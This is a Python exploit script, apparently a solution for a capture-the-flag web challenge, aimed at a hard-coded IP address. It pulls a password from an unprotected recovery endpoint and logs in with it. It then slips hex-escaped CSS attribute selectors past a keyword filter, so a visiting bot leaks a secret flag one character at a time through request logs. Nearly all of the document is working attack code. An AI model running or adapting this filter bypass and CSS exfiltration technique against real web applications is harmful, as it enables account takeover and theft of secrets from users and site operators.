#!/usr/bin/env python3
"""E.S.T.H.E.R #55 — recovery bypass + CSS attribute exfil via request logs."""
import re
import sys
import time
import urllib.parse
import urllib.request
from http.cookiejar import CookieJar

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://57.128.112.118:12421"
ALPHABET = "SHLK{}_0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKMNOPQRSTUVWXYZ"


def session_opener():
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(CookieJar()))


def get_tech_pass(op):
    url = f"{BASE}/tech/recovery?"
    with op.open(url, timeout=10) as r:
        import json

        data = json.loads(r.read().decode())
    return data["recovery_value"]


def login_tech(op, tech_pass):
    data = urllib.parse.urlencode({"q": tech_pass}).encode()
    req = urllib.request.Request(f"{BASE}/", data=data, method="POST")
    op.open(req, timeout=10)


def css_safe(css):
    if len(css) > 50:
        return False
    forbidden = [
        "[",
        "]",
        "*",
        "^",
        "<",
        ">",
        "'",
        '"',
        "-",
        "val",
        "attr",
        ":",
        "if",
        "else",
        "javascript:",
        "{",
        "}",
        "div",
        "body",
        "html",
        "form",
        "script",
        "img",
        "expression",
        "onerror",
        "onload",
        "set",
        "background",
        "http",
    ]
    low = css.lower()
    return not any(fs in low for fs in forbidden)


def esc_attr(value: str) -> str:
    out = []
    for c in value:
        if c in "{}[]^\\":
            out.append(f"\\{ord(c):x}")
        else:
            out.append(c)
    return "".join(out)


def build_css(prefix: str, marker: str) -> str:
    # [checker^=PREFIX]{cursor:url(/MARKER)}
    css = f"\\5bchecker\\5e\\3d{esc_attr(prefix)}\\7bcursor\\3aurl(/{marker})\\7d"
    if not css_safe(css):
        raise ValueError(f"CSS rejected ({len(css)}): {css!r}")
    return css


def set_css(op, css):
    data = urllib.parse.urlencode({"css": css}).encode()
    req = urllib.request.Request(f"{BASE}/tech/set_css", data=data, method="POST")
    op.open(req, timeout=10)


def get_logs(op) -> str:
    with op.open(f"{BASE}/tech", timeout=10) as r:
        html = r.read().decode()
    return html


def log_has_path(html: str, marker: str) -> bool:
    return f"/{marker}" in html or f"/{marker}?" in html


def wait_bot(max_wait=20, op=None, marker=None):
    deadline = time.time() + max_wait
    while time.time() < deadline:
        if op and marker:
            html = get_logs(op)
            if log_has_path(html, marker):
                return True
        time.sleep(2)
    return False


def exfil_flag(op) -> str:
    flag = ""
    for _ in range(80):
        found = None
        for ch in ALPHABET:
            prefix = flag + ch
            marker = f"x{len(prefix)}{ord(ch)}"
            css = build_css(prefix, marker)
            set_css(op, css)
            hit = wait_bot(22, op, marker)
            html = get_logs(op)
            if hit or log_has_path(html, marker):
                found = ch
                print(f"[+] prefix -> {prefix!r}", flush=True)
                break
        if not found:
            print(f"[*] done at {flag!r}", flush=True)
            break
        flag += found
        if flag.endswith("}"):
            break
    return flag


def main():
    op = session_opener()
    tech_pass = get_tech_pass(op)
    print(f"[+] tech_pass={tech_pass}", flush=True)
    login_tech(op, tech_pass)
    print("[+] logged in as tech", flush=True)

    # sanity: marker that always matches if bot posted SHLK...
    test_css = build_css("S", "sanity")
    set_css(op, test_css)
    print(f"[*] waiting for bot (css={test_css!r})", flush=True)
    wait_bot(20)
    html = get_logs(op)
    if "sanity" in html:
        print("[+] bot traffic visible in logs", flush=True)
    else:
        print("[!] no sanity hit yet — continuing anyway", flush=True)
        print(html[:2000])

    flag = exfil_flag(op)
    print(f"\n[FLAG] {flag}", flush=True)
    if flag.startswith("SHLK{") and flag.endswith("}"):
        print("[!] Flag candidate only: submit manually if you are allowed to do so.")


if __name__ == "__main__":
    main()
